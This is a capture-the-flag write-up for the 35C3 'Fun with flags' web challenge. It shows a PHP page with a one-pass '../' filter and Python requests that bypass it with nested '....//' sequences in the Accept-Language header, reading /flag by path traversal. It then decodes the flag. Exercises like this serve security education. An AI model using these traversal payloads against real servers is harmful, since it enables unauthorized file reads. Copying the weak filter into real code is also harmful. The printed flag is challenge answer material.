# challenge

> Fun with flags: http://35.207.169.47
>
> Flag is at /flag
>
> Difficulty estimate: Easy

On the website a page gets rendered (I'm not reproducing the rendering here) that **displays**

```
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';


Warning: file_get_contents(flags/de-DE): failed to open stream: No such file or directory in /var/www/html/index.php on line 6
```

(and an image below).

This can be read. And we notice that we can manipulate the page by asking the
server for a different language over http headers.

## Stabs

```py
import requests
url = "http://35.207.169.47/
requests.get(url, headers={"Accept-Language": "us"}).content
```

Like this we get a new html page dumped to the command line and can look around in it.

Looking at the php, we cannot just ask for `Accept-Language=../flag`, that will
be filtered out, and likewise `../../` (php filters all matches, not just the
first). However, we can golf a language that - after replacement - yields `../`:

```
requests.get(url, headers={"Accept-Language": "....//flag"}).content
```

looks almost good, except the response says
```
<br />\n<b>Warning</b>:  file_get_contents(flags/../flag): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>6</b><br />
```
I.e. we aren't in `/` and I have no idea how to tell where we are, so … brute force iterating until

```
>>> requests.get(url, headers={"Accept-Language": "....//....//....//....//....//....//flag"}).content
b'<code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php<br />&nbsp;&nbsp;highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">\'HTTP_ACCEPT_LANGUAGE\'</span><span style="color: #007700">]&nbsp;??&nbsp;</span><span style="color: #DD0000">\'ot\'</span><span style="color: #007700">;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">explode</span><span style="color: #007700">(</span><span style="color: #DD0000">\',\'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">)[</span><span style="color: #0000BB">0</span><span style="color: #007700">];<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">\'../\'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">\'\'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/</span><span style="color: #0000BB">$lang</span><span style="color: #DD0000">"</span><span style="color: #007700">);<br />&nbsp;&nbsp;if&nbsp;(!</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/ot"</span><span style="color: #007700">);<br />&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">\'&lt;img&nbsp;src="data:image/jpeg;base64,\'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">base64_encode</span><span style="color: #007700">(</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;.&nbsp;</span><span style="color: #DD0000">\'"&gt;\'</span><span style="color: #007700">;<br /><br /></span>\n</span>\n</code><img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">'
```

So the flag is base 64 encoded `MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=` which decodes:

```py
>>> import base64
>>> base64.decodebytes(b"MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=")
b'35c3_this_flag_is_the_be5t_fl4g\n'
```

[![Creative Commons License](https://i.creativecommons.org/l/by-sa/4.0/80x15.png) This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/)]

